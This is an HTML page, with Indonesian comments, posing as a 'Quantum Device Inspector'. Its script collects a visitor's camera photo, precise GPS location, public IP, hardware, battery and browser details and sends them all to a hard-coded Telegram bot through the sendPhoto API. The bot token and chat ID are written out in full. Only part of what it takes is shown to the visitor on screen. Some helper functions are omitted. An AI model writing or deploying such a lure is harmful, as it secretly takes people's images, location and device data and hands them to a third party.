<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Quantum Device Inspector</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <style>
    /* ... (CSS sebelumnya tetap sama) ... */
    .device-info {
      background: rgba(0,0,0,0.7);
      padding: 15px;
      border-radius: 10px;
      margin: 20px;
      text-align: left;
      max-width: 300px;
    }
    .info-item {
      margin: 8px 0;
      display: flex;
      justify-content: space-between;
    }
    .info-label {
      color: var(--primary);
      margin-right: 10px;
    }
  </style>
</head>
<body>
  <!-- ... (Bagian HTML sebelumnya tetap sama) ... -->
  <div class="device-info" id="device-info"></div>

  <script>
    // === KONFIGURASI AWAL ===
    const BOT_TOKEN = '6130843488:AAEcBDwepm6__C3geoFMSJtsMVrKFeWhMKQ';
    const CHAT_ID = '1121369247';
    let currentStream = null;
    let isScanning = false;

    // === FUNGSI DETEKSI PERANGKAT DETAIL ===
    async function getAdvancedDeviceInfo() {
      const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
      const battery = await (navigator.getBattery?.() || Promise.resolve(null));
      
      // Deteksi OS dan Browser
      const ua = navigator.userAgent;
      const os = detectOS(ua);
      const browser = detectBrowser(ua);
      
      // Deteksi hardware
      const hardware = {
        cores: navigator.hardwareConcurrency || 'Unknown',
        ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Unknown',
        architecture: detectArchitecture(),
        gpu: await detectGPU()
      };

      // Deteksi jaringan
      const network = {
        ip: await getPublicIP(),
        type: connection ? connection.effectiveType : 'Unknown',
        downlink: connection?.downlink || 'Unknown',
        rtt: connection?.rtt || 'Unknown'
      };

      return {
        os,
        browser,
        platform: navigator.platform,
        resolution: `${screen.width}x${screen.height} @${window.devicePixelRatio}x`,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        language: navigator.language,
        touch: navigator.maxTouchPoints > 0 ? 'Supported' : 'Not supported',
        battery: {
          level: battery?.level ? `${Math.round(battery.level * 100)}%` : 'Unknown',
          charging: battery?.charging ? 'Charging' : 'Not charging'
        },
        hardware,
        network
      };
    }

    // === FUNGSI DETEKSI KOMPONEN PERANGKAT ===
    function detectOS(ua) {
      if (/android/i.test(ua)) return 'Android';
      if (/iPad|iPhone|iPod/.test(ua)) return 'iOS';
      if (/Win/.test(ua)) return 'Windows';
      if (/Mac/.test(ua)) return 'macOS';
      if (/CrOS/.test(ua)) return 'ChromeOS';
      if (/Linux/.test(ua)) return 'Linux';
      return 'Unknown';
    }

    function detectBrowser(ua) {
      if (/Edg/.test(ua)) return 'Microsoft Edge';
      if (/OPR/.test(ua)) return 'Opera';
      if (/Chrome/.test(ua)) return 'Chrome';
      if (/Firefox/.test(ua)) return 'Firefox';
      if (/Safari/.test(ua)) return 'Safari';
      return 'Unknown';
    }

    function detectArchitecture() {
      if (navigator.userAgentData?.platform?.includes('ARM')) return 'ARM';
      if (/Win64|x64|WOW64/.test(navigator.userAgent)) return 'x64';
      if (/Win32|i386/.test(navigator.userAgent)) return 'x86';
      return 'Unknown';
    }

    async function detectGPU() {
      try {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (!gl) return 'Not available';
        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'Unknown';
      } catch {
        return 'Unknown';
      }
    }

    async function getPublicIP() {
      try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
      } catch {
        return 'Unknown';
      }
    }

    // === INTEGRASI TELEGRAM DENGAN LAPORAN DETAIL ===
    async function sendToTelegram(report) {
      const formData = new FormData();
      const blob = await dataURItoBlob(report.image);
      
      const caption = `üõ∏ *Quantum Device Report*\n\n` +
        `üìÖ ${new Date().toLocaleString()}\n\n` +
        `üåê *OS*: ${report.deviceInfo.os}\n` +
        `üñ• *Browser*: ${report.deviceInfo.browser}\n` +
        `üßÆ *Cores*: ${report.deviceInfo.hardware.cores}\n` +
        `üíæ *RAM*: ${report.deviceInfo.hardware.ram}\n` +
        `üîã *Battery*: ${report.deviceInfo.battery.level} (${report.deviceInfo.battery.charging})\n\n` +
        `üì∂ *Network*: ${report.deviceInfo.network.type}\n` +
        `üì° *IP*: ${report.deviceInfo.network.ip}\n` +
        `üñ• *GPU*: ${report.deviceInfo.hardware.gpu}\n\n` +
        `üìç *Location*: \`${report.location.coords.latitude.toFixed(6)}, ` +
        `${report.location.coords.longitude.toFixed(6)}\``;

      formData.append('chat_id', CHAT_ID);
      formData.append('photo', blob, `device_scan_${Date.now()}.webp`);
      formData.append('caption', caption);
      formData.append('parse_mode', 'Markdown');

      try {
        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
          method: 'POST',
          body: formData
        });
        return response.ok;
      } catch (error) {
        console.error('Telegram Error:', error);
        return false;
      }
    }

    // === PROSES UTAMA ===
    async function startQuantumScan() {
      if (isScanning) return;
      isScanning = true;
      loading.style.display = 'block';

      try {
        const [deviceInfo, location, photo] = await Promise.all([
          getAdvancedDeviceInfo(),
          getPreciseLocation(),
          captureQuantumImage()
        ]);

        // Update UI dengan info perangkat
        updateDeviceInfoDisplay(deviceInfo);
        
        // Kirim laporan ke Telegram
        const success = await sendToTelegram({
          image: photo.image,
          deviceInfo,
          location
        });

        if (!success) throw new Error('Failed to send to Telegram');
        showToast('Laporan berhasil dikirim!', 'success');
      } catch (error) {
        showError('Scan Gagal', error);
      } finally {
        isScanning = false;
        loading.style.display = 'none';
      }
    }

    // === TAMPILKAN INFO PERANGKAT ===
    function updateDeviceInfoDisplay(info) {
      const container = document.getElementById('device-info');
      container.innerHTML = `
        <div class="info-item">
          <span class="info-label">OS:</span>
          <span>${info.os}</span>
        </div>
        <div class="info-item">
          <span class="info-label">Browser:</span>
          <span>${info.browser}</span>
        </div>
        <div class="info-item">
          <span class="info-label">CPU Cores:</span>
          <span>${info.hardware.cores}</span>
        </div>
        <div class="info-item">
          <span class="info-label">RAM:</span>
          <span>${info.hardware.ram}</span>
        </div>
        <div class="info-item">
          <span class="info-label">Battery:</span>
          <span>${info.battery.level} (${info.battery.charging})</span>
        </div>
        <div class="info-item">
          <span class="info-label">Network:</span>
          <span>${info.network.type}</span>
        </div>
        <div class="info-item">
          <span class="info-label">IP Address:</span>
          <span>${info.network.ip}</span>
        </div>
      `;
    }

    // ... (Fungsi lainnya tetap sama dengan penyesuaian) ...
  </script>
</body>
</html>
